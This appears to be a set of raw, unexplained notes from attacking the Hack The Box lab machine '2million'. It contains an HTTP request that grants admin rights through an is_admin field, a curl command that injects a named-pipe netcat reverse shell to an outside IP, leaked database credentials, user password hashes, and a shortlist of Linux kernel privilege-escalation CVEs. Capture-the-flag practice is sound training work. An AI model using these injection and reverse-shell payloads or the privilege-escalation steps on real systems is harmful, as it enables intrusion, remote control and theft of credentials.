



64GLR-J3B6U-23ROK-6K1W9

test@test.com

lv4jargndd7io28fpcnk4pkq6g


feroxbuster -u http://2million.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt 


GET /api/v1 HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=uunul7pqq66sstr9cvdjn3jiad
Connection: keep-alive


admin priv esc (website)

```
PUT /api/v1/admin/settings/update HTTP/1.1
Host: 2million.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=uunul7pqq66sstr9cvdjn3jiad
Connection: keep-alive
Content-Length: 74
Content-Type: application/json

{
	"email":         "test@test.com",
"is_admin":1,
"username":"test"
}
```

Needed to use command injection to to enter the shell:

``curl -X POST http://2million.htb/api/v1/admin/vpn/generate --cookie "PHPSESSID=uunul7pqq66sstr9cvdjn3jiad"  --header "Content-Type: application/json" --data '{"username":"test && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.76 4444 >/tmp/f # "}'``


DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123


| 11 | TRX  | trx@hackthebox.eu  | 
$2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | 
$2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | test         | test@test.com              | $2y$10$27ehExxiqlpibVz5.vu.JuFGkjfNhzx4eQa0yuki3BLLqMp/mL4eW |        1 |




privEsc:

1.

/run/dbus/system_bus_socket                                                                                         
  └─(Read Write (Weak Permissions: 666) )
  └─(Owned by root)
  └─High risk: root-owned and writable Unix socket

2.

https://www.exploit-db.com/exploits/50808

3.

══╣ Potential local forwarders/relays (T1049)
admin      37393  0.0  0.0   6692  1112 pts/1    S+   18:35   0:00 sed -E s,socat|ssh|-L|-R|-D|ncat|nc,?[1;31;103m&?[0m,g


5.15.70-051570-generic
CVE-2023-0386


1 of deez:


```
CVE: CVE-2022-0847 | Name: DirtyPipe | Match data: pkg=linux-kernel,ver>=5.8,ver<=5.16.11 | Tags: ubuntu=(20.04|21.04),debian=11 | Rank: 1                                                                                              
CVE: CVE-2022-0995 | Name: watch_queue | Match data: pkg=linux-kernel,ver>=5.8,ver<5.16.5,x86_64 | Tags: ubuntu=21.10{kernel:5.13.0.37-generic} | Rank: 1 | Details: Not 100% reliable, may need to be run a couple of times. It rare cases it may panic the kernel.                                                                                        
CVE: CVE-2022-2586 | Name: nft_object UAF | Match data: pkg=linux-kernel,ver>=5.12,ver<5.19,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(20.04){kernel:5.12.13} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)                                                                   
CVE: CVE-2022-32250 | Name: nft_object UAF (NFT_MSG_NEWSET) | Match data: pkg=linux-kernel,ver<5.18.1,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=(22.04){kernel:5.15.0-27-generic} | Rank: 1 | Details: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)                                               
CVE: CVE-2023-0386 | Name: OverlayFS suid smuggle | Match data: pkg=linux-kernel,ver>=5.11,ver<=6.2,CONFIG_USER_NS=y,sysctl:kernel.unprivileged_userns_clone==1 | Tags: ubuntu=22.04.1{kernel:5.15.0-57-generic} | Rank: 1 | Details: CONFIG_USER_NS needs to be enabled && kernel.unprivileged_userns_clone=1 required                                     
═╣ Kernel vulns found: 5

```

---
 1. CVE-2022-2586






---
2. CVE-2022-32250






---
3. CVE-2023-0386